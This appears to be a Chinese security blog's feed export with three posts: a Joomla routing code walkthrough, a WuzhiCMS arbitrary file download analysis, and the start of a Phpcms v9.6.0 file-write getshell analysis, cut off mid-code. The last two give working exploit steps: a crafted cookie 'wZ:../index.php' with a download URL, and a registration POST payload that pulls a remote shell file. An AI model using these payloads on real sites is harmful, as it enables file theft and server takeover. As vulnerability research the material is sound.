class="headerlink" title="2.2 模块的另外一种调用方法"></a>2.2 模块的另外一种调用方法</h3><p>有时候会需要在程序里调用一个模块来显示，可以用以下程序来调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 该程序会显示所有设置在position位置上的模块，当然也会根据菜单ID来判断是否加载</span></span><br><span class="line">$modules = &amp;amp; JModuleHelper::getModules(<span class="string">'position'</span>);</span><br><span class="line"><span class="keyword">foreach</span>($modules <span class="keyword">as</span> $module)&#123;</span><br><span class="line"><span class="keyword">echo</span> JModuleHelper::renderModule($module, <span class="keyword">array</span>(<span class="string">'style'</span> = <span class="string">'well'</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-模板"><a href="#3-模板" class="headerlink" title="3.模板"></a>3.模板</h2><p> 个人理解，模板就相当于输出的一种格式。也就是在后端已经调用了相关的数据，准备在前端以什么样的格式输出。</p><p> 在Joomla中，一个页面只能有一个主要内容（组件：component），其他均属于模块。如图：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045892298827.jpg" alt=""></p><p>如果从代码来分析的话，打开index.php（组件下的index.php），除了简单的HTML和php外，还可以看到以下几类语句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jdoc:<span class="keyword">include</span> type=<span class="string">"head"</span></span><br><span class="line">jdoc:<span class="keyword">include</span> type=<span class="string">"modules"</span> name=<span class="string">"position-1"</span> style=<span class="string">"none"</span></span><br><span class="line">jdoc:<span class="keyword">include</span> type=<span class="string">"message"</span></span><br><span class="line">jdoc:<span class="keyword">include</span> type=<span class="string">"component"</span></span><br></pre></td></tr></table></figure><p>这些是Joomla引入内容的方式，Joomla模板引擎会解析这些语句，抓取对应的内容渲染到模板中，组成一个页面。type指明要包含的内容的类型：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">head        <span class="comment"># 页面头文件（包括css/javascript/meta标签），注意这里不是指网站内容的头部</span></span><br><span class="line">modules     <span class="comment"># 模块</span></span><br><span class="line">message     <span class="comment"># 提示消息</span></span><br><span class="line">component   <span class="comment"># 组件</span></span><br></pre></td></tr></table></figure><p>从代码中也可以看出，页面里只有一个component，同时有许多个modules。事实上message也是一个module，只是是一个比较特殊的module。</p><p>以<code>http://127.0.0.1:9999/index.php?option=com_content&amp;view=article&amp;id=7:article-en-gb&amp;catid=10&amp;lang=en&amp;Itemid=116</code>为例从URL来分析模板内容的话，可以清晰的看出：在Joomla的URL中，重要的信息通常包含两部分：组件信息、菜单ID：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">option=com_content  # 该页面内要使用的组件，后台对应到Components中，文件使用JOOMLAROOT components中的文件</span><br><span class="line">view=article       # 组件内要使用的view</span><br><span class="line">id=7               # view对应的ID</span><br><span class="line">Itemid=116          # 该页面对应的菜单ID</span><br></pre></td></tr></table></figure><p>所以上面URL的意思就是告诉Joomla：当前页面是要显示一个文章分类页面，分类ID是7，对应的菜单ID是116。</p><p>最后附一张图，帮助理解：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045892469548.jpg" alt=""></p><h1 id="0x02-整体大致运行流程"><a href="#0x02-整体大致运行流程" class="headerlink" title="0x02 整体大致运行流程"></a>0x02 整体大致运行流程</h1><h2 id="1-框架核心代码的初始化"><a href="#1-框架核心代码的初始化" class="headerlink" title="1. 框架核心代码的初始化"></a>1. 框架核心代码的初始化</h2><ul><li><code>/includes/defines.php</code>定义各个功能模块的目录</li><li><p><code>/includes/framework.php</code>整个框架调度的核心代码与cms运行的核心代码，框架初始化的入口。</p><ul><li><p><code>/libraries/import.legacy.php</code>开启自动加载类，并向注册队列注册cms核心类。</p><p>  调用了<code>JLoader</code>中的setup方法；<code>spl_autoload_register</code>使其进行类的初始定义。</p><blockquote><p><code>spl_autoload_register()</code>是PHP自带的系统函数，其主要完成的功能就是注册给定的函数作为<code>__autoload</code>的实现。即将函数注册到<code>SPL__autoload</code>函数队列中。如果该队列尚未激活，则激活它们。</p></blockquote><ul><li><code>/libraries/loader.php</code>定义了<code>JLoader</code>实现类的注册，加载，相关文件的包含等操作。</li><li>其中<code>load</code>方法从注册队列中寻找需要被自动加载的类，并包含该注册队列的值。</li><li><code>_autoload</code>方法从注册队列中的<code>prefixes</code>的<code>J</code>中选取需要加载的类目录的前缀。<code>[0]=&gt;/joomla/libraries/joomla</code>，<code>[1]=&gt;/joomla/libraries/legacy</code></li><li><code>_load</code>方法完成了绝对路径的拼接，及相关文件的包含</li></ul></li><li><p><code>/cms.php</code>将<code>PHP Composer</code>生成的加载器<code>autoload_static.php</code>、<code>/autoload_namespaces.php</code>、<code>/autoload_psr4.php</code>、<code>/autoload_classmap.php</code>中的内容全部导入一个<code>$loader</code>的数组，之后将该数组中的前缀及所有类，注册到注册队列中，以方便使用。而这些类，都是针对于cms本身的操作的。接着开始设置异常处理以及一个消息处理器（日志）。最后，将一些注册类的名字规范为<code>autoloader</code>的规则。</p></li><li><p><code>configuration.php</code>配置项</p></li><li><p>之后设置报错的格式</p><p>  最终的注册队列：</p><p>  <img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045892657574.png" alt=""></p><p>  <img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045892765399.png" alt=""></p><p>  <img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045892951347.png" alt=""></p><p>  <img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045893053364.png" alt=""></p></li></ul></li></ul><h2 id="2-设置分析器，记下使用方法并在分析器后加标记对应代码"><a href="#2-设置分析器，记下使用方法并在分析器后加标记对应代码" class="headerlink" title="2. 设置分析器，记下使用方法并在分析器后加标记对应代码"></a>2. 设置分析器，记下使用方法并在分析器后加标记对应代码</h2><p>对应代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JDEBUG ? JProfiler::getInstance(<span class="string">'Application'</span>)-&gt;setStart($startTime, $startMem)-&gt;mark(<span class="string">'afterLoad'</span>) : <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure><h2 id="3-实例化应用程序"><a href="#3-实例化应用程序" class="headerlink" title="3. 实例化应用程序"></a>3. 实例化应用程序</h2><p>对应代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$app = JFactory::getApplication(<span class="string">'site'</span>);</span><br></pre></td></tr></table></figure><p>在这边可能会有疑问，为什么会直接实例化一个之前没有引入的类（同样也没有包含相应的文件）。</p><p>还记得我们之前看到过的自动加载类么，在这里，我们首先发现没有在<code>classmap</code>中寻找到，之后在<code>/libraries</code>目录，以<code>/libraries/cms/</code>目录为查找目录，在该目录查找是否存在<code>factory.php</code>文件，若找到，则将该文件包含进来。</p><p>在<code>factory.php</code>中，会首先检查我们是否已经创建了一个<code>JApplicationCms</code>对象，如果未创建该对象，则创建该对象。最后创建为<code>JApplicationSite</code>，并将这个对象实例化（对象位于<code>/libraries/cms/application/site.php</code>）。</p><p>在该文件中，首先注册了<code>application</code>（这边是site）的名称与ID，之后执行父构造函数和“祖父“构造函数。</p><p>为了清晰的说明Joomla web应用的实例化过程，我们列一个树状图来看</p><p>|-web.php   “祖父”<br>|–cms.php  父<br>|—site.php    子 </p><blockquote><p>web.php<br>完成了应用的最基础功能，包括：</p><ol><li>返回对全局JApplicationWeb对象的引用，仅在不存在的情况下创建它</li><li>初始化应用程序</li><li>运行应用程序</li><li>对模板的渲染（文档缓冲区推入模板的过程占位符，从文档中检索数据并将其推入应用程序响应缓冲区。）</li><li>检查浏览器的接受编码，并尽可能的将发送给客户端的数据进行压缩。</li><li>将应用程序响应发送给客户端</li><li>URL的重定向</li><li>应用程序配置对象的加载</li><li>设置/获取响应的可缓存状态</li><li>设置响应头的获取、发送与设置等基本功能</li></ol></blockquote><p>首先在<code>web.php</code>中实例化了<code>JInput</code>对象。并将config指向<code>Joomla\Registry\Registry</code>。接着，创建了一个应用程序程序的网络客户端，用于进行网络请求的操作。同时将已经指向的config导入，设置执行时间，初始化请求对象，并配置系统的URIs。</p><p>在<code>cms.php</code>中实例化了调度器，主要完成对于组件及模块的调度。并对session进行设置和初始化。</p><p>完成了以上所有的配置后，将已经配置完毕的应用对象返回到<code>/joomla/libraries/joomla/factory.php</code>中。完成应用对象的初始化。</p><h2 id="4-执行应用"><a href="#4-执行应用" class="headerlink" title="4. 执行应用"></a>4. 执行应用</h2><p>调用web.php中的<code>execute()</code>方法完成应用的执行。</p><h1 id="0x03-说一下我们的关心的路由问题"><a href="#0x03-说一下我们的关心的路由问题" class="headerlink" title="0x03 说一下我们的关心的路由问题"></a>0x03 说一下我们的关心的路由问题</h1><p>那么，我们的路由在框架中到底是怎样解析的呢？</p><p>其实在跟实例化应用的时候，当执行<code>/joomla/libraries/joomla/application/web.php</code>构造函数时，我们就可以看到Joomla对于URI的处理了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;loadSystemUris();</span><br></pre></td></tr></table></figure><p>跟进看一下<code>loadSystemUris</code>方法，不难看到这一句：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045893232898.png" alt=""></p><p>跟进<code>detectRequestUri</code>，发现首先判断了URI是否是http还是https，之后看到这句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_SERVER[<span class="string">'PHP_SELF'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_SERVER[<span class="string">'REQUEST_URI'</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// The URI is built from the HTTP_HOST and REQUEST_URI environment variables in an Apache environment.</span></span><br><span class="line">$uri = $scheme . $_SERVER[<span class="string">'HTTP_HOST'</span>] . $_SERVER[<span class="string">'REQUEST_URI'</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是在这里将<code>$_SERVER[&#39;REQUEST_URI&#39;]</code>中的相对路径与<code>$scheme . $_SERVER[&#39;HTTP_HOST&#39;]</code>拼接成了完整的URI：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045893426980.png" alt=""><br><img src="http://139.129.31.35/usr/uploads/2017/05/475182260.png" alt="ur"></p><p>完成了完整路径获取后，开始修改对象的属性，将新获得的request.uri添加进入配置列表中：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045893504687.png" alt=""><br><img src="http://139.129.31.35/usr/uploads/2017/05/1509964390.png" alt="ur"></p><p>下一步，就是遍历配置列表，查看是否已经设置了显示URI，在配置列表中键值为<code>site_uri</code>。显然我们现在并没有设置该选项：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045893579514.png" alt=""></p><p>之后完成的操作就是要设置该显示URI。我们继续跟进一下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045893734916.png" alt=""></p><p>跟进到<code>joomla/libraries/vendor/joomla/uri/src/UriHelper.php</code>的时候，我们稍停一下，看到进入了<code>parse_url</code>方法中。在这个方法中，首先对传入的URL进行了双重过滤，之后利用PHP自带方法<code>parse_url</code>，对URL进行了分割处理并保存到一个数组中，接着返回该数组：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045893830962.png" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045893931299.png" alt=""></p><p>最后的处理结果为：</p><p><code>option=com_content&amp;view=article&amp;id=7:article-en-gb&amp;catid=10&amp;lang=en&amp;Itemid=116</code></p><p>处理完我们的显示URL后，在调用<code>joomla/libraries/cms/application/cms.php</code>中的<code>execute</code>方法时，在调用<code>doExecute</code>方法的时候，会使用<code>joomla/libraries/cms/application/site.php</code>文件中的<code>route</code>方法，这个方法将路由到我们application中。</p><p>在<code>joomla/libraries/cms/application/cms.php</code>中的<code>route</code>方法中，我们首先获取了全部的request URI，之后在<code>getRouter</code>方法中初始化并实例化了<code>joomla/libraries/cms/router/router.php</code>中的<code>JRouter</code>类，该类完成了对我们路由参数的识别与划分：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045894036447.png" alt=""></p><p>最后在<code>joomla/libraries/cms/router/site.php</code>中的<code>parse</code>方法中完成了相关组件的路由：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045894146895.png" alt=""></p><p>可以明显的看到，在</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$component = <span class="keyword">$this</span>-&gt;JComponentHelper::getComponents()</span><br></pre></td></tr></table></figure><p>后，<code>$component</code>的值：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045894256014.jpg" alt=""></p><p>对比<code>components/</code>目录下的组件，发现已经将所有的组件遍历，并保存在数组中。</p><p>接着遍历该数组，对每个组件设置本地路由，并包含响应的文件，从而完成路由控制。</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045894330060.png" alt=""></p><h1 id="0x04-总结一下"><a href="#0x04-总结一下" class="headerlink" title="0x04 总结一下"></a>0x04 总结一下</h1><p>Joomla整体的运行思路可以简单的归结为一下几点：</p><ol><li><p>框架核心代码的初始化：</p><p> 关键是初始化了类自动加载器与消息处理器，并完成了配置文件的配置与导入。<br> 完成了这一步，就可以通过类的自动加载器来实现核心类的查找与调用。自动加载器成为了cms的一个工具。</p></li><li><p>实例化应用程序：</p><p> 这一步可以简单的理解为对Joomla接下来要提供的web服务的预加，与定义。</p></li><li><p>应用的执行：</p><p> 这一步基于上面两步的准备，将执行应用。从代码上来看可以容易的总结出来一个规律：</p><ul><li>预加载“执行之前需要做的事件”</li><li>执行应用</li><li><p>执行“执行之后要做的事件”</p><p>基本上都是以这样的形式来完成调用以及运行的。</p></li></ul></li></ol><p>以上都是小菜个人看法，可能有不准确或者非常模糊的地方，希望大牛们多给建议…<br>QAQ…</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近爆出的Joomla!3.7.0 Core SQL注入漏洞，在分析的时候难免会接触到一些框架本身调用的问题。本着知根知底的想法，我开始了对Joomla框架的简单跟进。&lt;/p&gt;
&lt;p&gt;PS：本人小菜一个，本篇很大程度上是基于本人对代码的跟踪、总结而写的，可能有很多地方不是很准确，希望大牛们勿喷，多给予一些分享。&lt;/p&gt;
    
    </summary>
    
      <category term="安全研究" scheme="https://lucifaer.com/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="安全研究" scheme="https://lucifaer.com/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
      <category term="Joomla" scheme="https://lucifaer.com/tags/Joomla/"/>
    
  </entry>
  
  <entry>
    <title>五指CMS任意文件下载漏洞</title>
    <link href="https://lucifaer.com/2017/05/09/%E4%BA%94%E6%8C%87CMS%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"/>
    <id>https://lucifaer.com/2017/05/09/五指CMS任意文件下载漏洞/</id>
    <published>2017-05-08T16:52:09.000Z</published>
    <updated>2018-11-29T09:33:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近问<a href="http://balis0ng.com/" target="_blank" rel="noopener">balis0ng师傅</a>要了份源码来看一看，发现几个比较简单的漏洞，这边记录一下。</p><a id="more"></a><h2 id="0x00-漏洞触发点"><a href="#0x00-漏洞触发点" class="headerlink" title="0x00 漏洞触发点"></a>0x00 漏洞触发点</h2><p>在<code>/wuzhi/coreframe/app/content/down.php</code>中<code>down</code>类中的<code>d()</code>方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">d</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($GLOBALS[<span class="string">'s'</span>]) &amp;&amp; !<span class="keyword">empty</span>($GLOBALS[<span class="string">'s'</span>])) &#123;</span><br><span class="line">            $file = decode($GLOBALS[<span class="string">'s'</span>]);</span><br><span class="line">            <span class="keyword">if</span> (strpos($file, <span class="string">'wZ:'</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">                $file = str_replace(<span class="string">'wZ:'</span>,ATTACHMENT_ROOT,$file);</span><br><span class="line">                download($file);</span><br><span class="line">            &#125; <span class="keyword">elseif</span>(preg_match(<span class="string">'/^http:|https:|ftp:/'</span>,$file)) &#123;</span><br><span class="line">                <span class="comment">//远程地址下载</span></span><br><span class="line">                header(<span class="string">"Location:"</span>.$file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到这里并没有对<code>s</code>进行任何处理，直接使用<code>$GLOBALS</code>对<code>s</code>参数进行了获取。只要我们可以控制<code>decode($GLOBALS[&#39;s&#39;])</code>的值，就可以越权实现任意文件下载。</p><h2 id="0x01-具体实现过程"><a href="#0x01-具体实现过程" class="headerlink" title="0x01 具体实现过程"></a>0x01 具体实现过程</h2><h3 id="1-1-查看encode是否可逆"><a href="#1-1-查看encode是否可逆" class="headerlink" title="1.1 查看encode是否可逆"></a>1.1 查看encode是否可逆</h3><p>为了控制<code>decode($GLOBALS[&#39;s&#39;])</code>的值，我们需要看一下是否该<code>encode</code>函数可逆，在<code>/wuzhi/coreframe/core.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span><span class="params">($string,$key = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">    $encode = load_class(<span class="string">'encrypt'</span>);</span><br><span class="line">    <span class="keyword">return</span> $encode-&gt;encode($string,$key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进<code>/wuzhi/coreframe/app/core/libs/class/encrypt.class.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">encode</span><span class="params">($string, $key = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">        $key = $key == <span class="string">''</span> ? _KEY : $key;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;_support_mcrypt) &#123;</span><br><span class="line">            <span class="keyword">return</span> base64_encode(<span class="keyword">$this</span>-&gt;mcrypt_encode($string, $key));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_authcode($string, <span class="string">'ENCODE'</span>, $key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>继续跟进：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_add_cipher_noise</span><span class="params">($data, $key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $key = md5($key);</span><br><span class="line">        $str = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>, $j = <span class="number">0</span>, $ld = strlen($data), $lk = strlen($key); $i &lt; $ld; ++$i, ++$j)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ($j &gt;= $lk)</span><br><span class="line">            &#123;</span><br><span class="line">                $j = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $str .= chr((ord($data[$i]) + ord($key[$j])) % <span class="number">256</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $str;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>经过分析，这个加密好像是不可逆的，那么我们就到此为止了么。</p><h3 id="1-2-寻找调用encode且可控的模块及函数"><a href="#1-2-寻找调用encode且可控的模块及函数" class="headerlink" title="1.2 寻找调用encode且可控的模块及函数"></a>1.2 寻找调用encode且可控的模块及函数</h3><p>我们经过全局搜索，找到了在<code>set_cookie()</code>函数（<code>/wuzhi/coreframe/core.php</code>）中，调用了<code>encode()</code>函数，也就是说，接下来要寻找调用<code>set_cookie()</code>函数，且输出结果可控的模块及方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_cookie</span><span class="params">($string, $value = <span class="string">''</span>, $time = <span class="number">0</span>, $encrypt = true)</span> </span>&#123;</span><br><span class="line">    $time = $time &gt; <span class="number">0</span> ? $time : ($value == <span class="string">''</span> ? SYS_TIME - <span class="number">3600</span> : <span class="number">0</span>);</span><br><span class="line">    $s = $_SERVER[<span class="string">'SERVER_PORT'</span>] == <span class="string">'443'</span> ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">    $string = COOKIE_PRE.$string;</span><br><span class="line">    <span class="keyword">if</span>($encrypt) $value = encode($value);</span><br><span class="line">    setcookie($string, $value, $time, COOKIE_PATH, COOKIE_DOMAIN, $s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>全局搜索调用<code>set_cookie()</code>函数的位置，在<code>/wuzhi/coreframe/app/content/index.php</code>发现了可控输入，且根据可控输入生成相应的cookie：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$cookie_city = $_COOKIE[COOKIE_PRE.<span class="string">'city_key'</span>];</span><br><span class="line">        <span class="keyword">if</span>($cookie_city) &#123;</span><br><span class="line">            set_cookie(<span class="string">'city'</span>,$cookie_city);</span><br><span class="line">            $city = $cookie_city;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>且需要设置的cookie名称为一个系统本身的cookie前缀+city_key。前缀在<code>wuzhi/www/configs/web_config.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">'COOKIE_PRE'</span>,<span class="string">'aHU_'</span>); <span class="comment">//Cookie 前缀</span></span><br></pre></td></tr></table></figure><p>综上，我们只需要将构造好的cookie：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cookie名：aHU_city_key</span><br><span class="line">cookie值：wZ:../index.php</span><br></pre></td></tr></table></figure><p>传入，并获取加密后的值（位于），之后再讲加密的值传入d参数中就可进行任意文件下载。</p><h2 id="0x03-利用过程"><a href="#0x03-利用过程" class="headerlink" title="0x03 利用过程"></a>0x03 利用过程</h2><p>首先访问<code>http://127.0.0.1:8888/m=content&amp;f=index&amp;v=init</code>。根据上面的分析我们需要设置<code>cookie</code>为：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD1.png" alt="任意文件下载1"></p><p>刷新页面，可以看到：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD2.png" alt="任意文件下载2"></p><p>在<code>cookie</code>名为<code>aHU_city</code>中获得加密后的内容，即为<code>wZ:../index.php</code>。</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD3.png" alt="任意文件下载3"></p><p>之后访问<code>http://127.0.0.1:8888?m=content&amp;f=down&amp;v=d&amp;s=DcR5UIuD2R08LqIz92OW%2Bi0M7gZNCD8o</code></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD4.png" alt="任意文件下载4"></p><p>可以看到index.php文件即被下载，实现了任意文件下载。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近问&lt;a href=&quot;http://balis0ng.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;balis0ng师傅&lt;/a&gt;要了份源码来看一看，发现几个比较简单的漏洞，这边记录一下。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://lucifaer.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://lucifaer.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="PHP" scheme="https://lucifaer.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Phpcms V9.6.0任意文件写入getshell</title>
    <link href="https://lucifaer.com/2017/04/13/Phpcms%20V9.6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5getshell/"/>
    <id>https://lucifaer.com/2017/04/13/Phpcms V9.6.0任意文件写入getshell/</id>
    <published>2017-04-13T08:41:00.000Z</published>
    <updated>2018-11-29T09:37:35.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-漏洞简述"><a href="#0x00-漏洞简述" class="headerlink" title="0x00 漏洞简述"></a>0x00 漏洞简述</h1><h2 id="1-漏洞简介"><a href="#1-漏洞简介" class="headerlink" title="1. 漏洞简介"></a>1. 漏洞简介</h2><p>上周phpcms v9.6的任意文件上传的漏洞，已经潜伏半年多的一个漏洞。该漏洞可以在用户注册界面以未授权的情况下实现任意文件上传。</p><h2 id="2-漏洞影响版本"><a href="#2-漏洞影响版本" class="headerlink" title="2. 漏洞影响版本"></a>2. 漏洞影响版本</h2><p>phpcms v9.6</p><a id="more"></a><h1 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h1><p>正常部署phpcms v9.6就好。</p><p>复现过程中，可以在用户注册页面通过POST提交：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">siteid=1&amp;modelid=1&amp;username=123456&amp;password=123456&amp;email=123456@qq.com&amp;info[content]=&lt;img src=http://127.0.0.1/shell.txt?.php#.jpg&gt;&amp;dosubmit=1&amp;protocol=</span><br></pre></td></tr></table></figure><p>在<code>src</code>后面跟上自己shell的url。注意是要<code>.txt</code>格式写的shell。</p><h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><p>网上已经有逆向分析的过程，这次我来正向的分析一下这个洞。</p><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><h3 id="1-文件上传部分"><a href="#1-文件上传部分" class="headerlink" title="1. 文件上传部分"></a>1. 文件上传部分</h3><p>首先看到用户注册的模块，位于<code>phpcms/modules/member/index.php</code>的<code>register</code>方法中。</p><p>代码很多，一点点往下看：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;_session_start();</span><br><span class="line"><span class="comment">//获取用户siteid</span></span><br><span class="line">$siteid = <span class="keyword">isset</span>($_REQUEST[<span class="string">'siteid'</span>]) &amp;&amp; trim($_REQUEST[<span class="string">'siteid'</span>]) ? intval($_REQUEST[<span class="string">'siteid'</span>]) : <span class="number">1</span>;</span><br><span class="line"><span 